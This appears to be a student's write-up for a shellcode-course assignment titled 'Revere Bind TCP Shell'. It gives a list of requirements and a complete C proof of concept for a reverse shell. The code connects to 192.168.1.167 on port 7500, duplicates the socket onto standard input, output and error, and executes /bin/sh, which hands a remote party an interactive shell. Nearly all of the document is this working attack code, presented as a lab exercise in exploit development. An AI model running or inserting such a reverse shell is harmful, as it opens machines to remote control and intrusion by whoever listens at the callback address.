Assignment #2: Revere Bind TCP Shell
====================================

Instructions:
-------------
* Reverse connect to configured IP and Port
* Exec /bin/sh on successful connection
* IP and Port should be easily configurable

PoC:
----

```
int main(void){
	int fd;
	struct sockaddr_in server_addr;
	char *argv[] = { "/bin/sh", NULL };

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(7500);
	server_addr.sin_addr.s_addr = inet_addr("192.168.1.167");
	
	//socket
	fd = socket(AF_INET, SOCK_STREAM, 0);
	
	//connect
	connect(fd, (struct sockaddr *)&server_addr, 16);
	
	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);
	
	//execve /bin/sh
	execve(argv[0], &argv[0], NULL);
	
	return 0;
}
```
